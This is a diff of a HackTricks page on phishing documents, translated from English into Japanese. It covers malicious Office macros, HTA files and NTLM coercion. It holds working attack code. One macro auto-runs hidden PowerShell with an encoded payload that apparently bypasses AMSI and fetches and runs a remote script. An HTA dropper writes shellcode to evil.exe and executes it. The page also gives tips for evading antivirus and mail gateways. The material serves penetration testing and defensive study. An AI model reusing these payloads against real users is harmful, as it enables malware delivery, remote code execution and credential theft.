@@ -1,55 +1,52 @@
-# Phishing Files & Documents
+# フィッシングファイルとドキュメント
 
 {{#include ../../banners/hacktricks-training.md}}
 
-## Office Documents
+## Officeドキュメント
 
-Microsoft Word performs file data validation before opening a file. Data validation is performed in the form of data structure identification, against the OfficeOpenXML standard. If any error occurs during the data structure identification, the file being analysed will not be opened.
+Microsoft Wordはファイルを開く前にファイルデータの検証を行います。データ検証は、OfficeOpenXML標準に対するデータ構造の識別の形で行われます。データ構造の識別中にエラーが発生した場合、分析中のファイルは開かれません。
 
-Usually, Word files containing macros use the `.docm` extension. However, it's possible to rename the file by changing the file extension and still keep their macro executing capabilities.\
-For example, an RTF file does not support macros, by design, but a DOCM file renamed to RTF will be handled by Microsoft Word and will be capable of macro execution.\
-The same internals and mechanisms apply to all software of the Microsoft Office Suite (Excel, PowerPoint etc.).
+通常、マクロを含むWordファイルは`.docm`拡張子を使用します。しかし、ファイル拡張子を変更することでファイルの名前を変更し、マクロ実行機能を保持することが可能です。\
+例えば、RTFファイルは設計上マクロをサポートしていませんが、DOCMファイルをRTFに名前を変更すると、Microsoft Wordによって処理され、マクロの実行が可能になります。\
+同じ内部構造とメカニズムは、Microsoft Office Suiteのすべてのソフトウェア（Excel、PowerPointなど）に適用されます。
 
-You can use the following command to check which extensions are going to be executed by some Office programs:
-
+次のコマンドを使用して、いくつかのOfficeプログラムによって実行される拡張子を確認できます：
 ```bash
 assoc | findstr /i "word excel powerp"
 ```
+DOCXファイルは、マクロを含むリモートテンプレートを参照することができ（ファイル – オプション – アドイン – 管理: テンプレート – 移動）、マクロを「実行」することもできます。
 
-DOCX files referencing a remote template (File –Options –Add-ins –Manage: Templates –Go) that includes macros can “execute” macros as well.
+### 外部画像の読み込み
 
-### External Image Load
-
-Go to: _Insert --> Quick Parts --> Field_\
-&#xNAN;_**Categories**: Links and References, **Filed names**: includePicture, and **Filename or URL**:_ http://\<ip>/whatever
+次に進む: _挿入 --> クイックパーツ --> フィールド_\
+&#xNAN;_**カテゴリ**: リンクと参照, **フィールド名**: includePicture, **ファイル名またはURL**:_ http://\<ip>/whatever
 
 ![](<../../images/image (155).png>)
 
-### Macros Backdoor
+### マクロバックドア
 
-It's possible to use macros to run arbitrary code from the document.
+マクロを使用して、ドキュメントから任意のコードを実行することが可能です。
 
-#### Autoload functions
+#### 自動ロード関数
 
-The more common they are, the more probable the AV will detect them.
+一般的であればあるほど、AVがそれらを検出する可能性が高くなります。
 
 - AutoOpen()
 - Document_Open()
 
-#### Macros Code Examples
-
+#### マクロコードの例
 ```vba
 Sub AutoOpen()
-    CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
+CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
 End Sub
 ```
 
 ```vba
 Sub AutoOpen()
 
-  Dim Shell As Object
-  Set Shell = CreateObject("wscript.shell")
-  Shell.Run "calc"
+Dim Shell As Object
+Set Shell = CreateObject("wscript.shell")
+Shell.Run "calc"
 
 End Sub
 ```
@@ -58,8 +55,8 @@ End Sub
 Dim author As String
 author = oWB.BuiltinDocumentProperties("Author")
 With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
- .StdIn.WriteLine author
- .StdIn.WriteBlackLines 1
+.StdIn.WriteLine author
+.StdIn.WriteBlackLines 1
 ```
 
 ```vba
@@ -67,88 +64,85 @@ Dim proc As Object
 Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
 proc.Create "powershell <beacon line generated>
 ```
+#### メタデータを手動で削除する
 
-#### Manually remove metadata
+**ファイル > 情報 > ドキュメントの検査 > ドキュメントの検査**に移動すると、ドキュメントインスペクターが表示されます。**検査**をクリックし、次に**ドキュメントのプロパティと個人情報**の横にある**すべて削除**をクリックします。
 
-Fo to **File > Info > Inspect Document > Inspect Document**, which will bring up the Document Inspector. Click **Inspect** and then **Remove All** next to **Document Properties and Personal Information**.
+#### ドキュメント拡張子
 
-#### Doc Extension
+完了したら、**ファイルの種類**のドロップダウンを選択し、形式を**`.docx`**から**Word 97-2003 `.doc`**に変更します。\
+これは、**`.docx`**内にマクロを保存できず、マクロ対応の**`.docm`**拡張子には**スティグマ**があるためです（例：サムネイルアイコンに大きな`!`があり、一部のウェブ/メールゲートウェイはそれらを完全にブロックします）。したがって、この**レガシー`.doc`拡張子が最良の妥協案です**。
 
-When finished, select **Save as type** dropdown, change the format from **`.docx`** to **Word 97-2003 `.doc`**.\
-Do this because you **can't save macro's inside a `.docx`** and there's a **stigma** **around** the macro-enabled **`.docm`** extension (e.g. the thumbnail icon has a huge `!` and some web/email gateway block them entirely). Therefore, this **legacy `.doc` extension is the best compromise**.
-
-#### Malicious Macros Generators
+#### 悪意のあるマクロ生成ツール
 
 - MacOS
-  - [**macphish**](https://github.com/cldrn/macphish)
-  - [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)
+- [**macphish**](https://github.com/cldrn/macphish)
+- [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)
 
-## HTA Files
+## HTAファイル
 
-An HTA is a Windows program that **combines HTML and scripting languages (such as VBScript and JScript)**. It generates the user interface and executes as a "fully trusted" application, without the constraints of a browser's security model.
+HTAは、**HTMLとスクリプト言語（VBScriptやJScriptなど）を組み合わせたWindowsプログラム**です。ユーザーインターフェースを生成し、ブラウザのセキュリティモデルの制約なしに「完全に信頼された」アプリケーションとして実行されます。
 
-An HTA is executed using **`mshta.exe`**, which is typically **installed** along with **Internet Explorer**, making **`mshta` dependant on IE**. So if it has been uninstalled, HTAs will be unable to execute.
-
+HTAは**`mshta.exe`**を使用して実行され、通常は**Internet Explorer**と一緒に**インストール**されるため、**`mshta`はIEに依存しています**。したがって、IEがアンインストールされている場合、HTAは実行できません。
 ```html
 <--! Basic HTA Execution -->
 <html>
-  <head>
-    <title>Hello World</title>
-  </head>
-  <body>
-    <h2>Hello World</h2>
-    <p>This is an HTA...</p>
-  </body>
+<head>
+<title>Hello World</title>
+</head>
+<body>
+<h2>Hello World</h2>
+<p>This is an HTA...</p>
+</body>
 
-  <script language="VBScript">
-    Function Pwn()
-      Set shell = CreateObject("wscript.Shell")
-      shell.run "calc"
-    End Function
+<script language="VBScript">
+Function Pwn()
+Set shell = CreateObject("wscript.Shell")
+shell.run "calc"
+End Function
 
-    Pwn
-  </script>
+Pwn
+</script>
 </html>
 ```
 
 ```html
 <--! Cobal Strike generated HTA without shellcode -->
 <script language="VBScript">
-  Function var_func()
-  	var_shellcode = "<shellcode>"
+Function var_func()
+var_shellcode = "<shellcode>"
 
-  	Dim var_obj
-  	Set var_obj = CreateObject("Scripting.FileSystemObject")
-  	Dim var_stream
-  	Dim var_tempdir
-  	Dim var_tempexe
-  	Dim var_basedir
-  	Set var_tempdir = var_obj.GetSpecialFolder(2)
-  	var_basedir = var_tempdir & "\" & var_obj.GetTempName()
-  	var_obj.CreateFolder(var_basedir)
-  	var_tempexe = var_basedir & "\" & "evil.exe"
-  	Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
-  	For i = 1 to Len(var_shellcode) Step 2
-  	    var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
-  	Next
-  	var_stream.Close
-  	Dim var_shell
-  	Set var_shell = CreateObject("Wscript.Shell")
-  	var_shell.run var_tempexe, 0, true
-  	var_obj.DeleteFile(var_tempexe)
-  	var_obj.DeleteFolder(var_basedir)
-  End Function
+Dim var_obj
+Set var_obj = CreateObject("Scripting.FileSystemObject")
+Dim var_stream
+Dim var_tempdir
+Dim var_tempexe
+Dim var_basedir
+Set var_tempdir = var_obj.GetSpecialFolder(2)
+var_basedir = var_tempdir & "\" & var_obj.GetTempName()
+var_obj.CreateFolder(var_basedir)
+var_tempexe = var_basedir & "\" & "evil.exe"
+Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
+For i = 1 to Len(var_shellcode) Step 2
+var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
+Next
+var_stream.Close
+Dim var_shell
+Set var_shell = CreateObject("Wscript.Shell")
+var_shell.run var_tempexe, 0, true
+var_obj.DeleteFile(var_tempexe)
+var_obj.DeleteFolder(var_basedir)
+End Function
 
-  var_func
-  self.close
+var_func
+self.close
 </script>
 ```
+## NTLM認証の強制
 
-## Forcing NTLM Authentication
+**リモートでNTLM認証を強制する**方法はいくつかあります。たとえば、ユーザーがアクセスするメールやHTMLに**見えない画像**を追加することができます（HTTP MitMでも？）。または、被害者に**フォルダを開くだけで**認証を**トリガー**する**ファイルのアドレス**を送信することもできます。
 
-There are several ways to **force NTLM authentication "remotely"**, for example, you could add **invisible images** to emails or HTML that the user will access (even HTTP MitM?). Or send the victim the **address of files** that will **trigger** an **authentication** just for **opening the folder.**
-
-**Check these ideas and more in the following pages:**
+**次のページでこれらのアイデアやその他を確認してください：**
 
 {{#ref}}
 ../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
@@ -158,11 +152,11 @@ There are several ways to **force NTLM authentication "remotely"**, for example,
 ../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
 {{#endref}}
 
-### NTLM Relay
+### NTLMリレー
 
-Don't forget that you cannot only steal the hash or the authentication but also **perform NTLM relay attacks**:
+ハッシュや認証を盗むだけでなく、**NTLMリレー攻撃を実行する**こともできることを忘れないでください：
 
-- [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
-- [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)
+- [**NTLMリレー攻撃**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
+- [**AD CS ESC8 (NTLMリレーから証明書へ)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)
 
 {{#include ../../banners/hacktricks-training.md}}
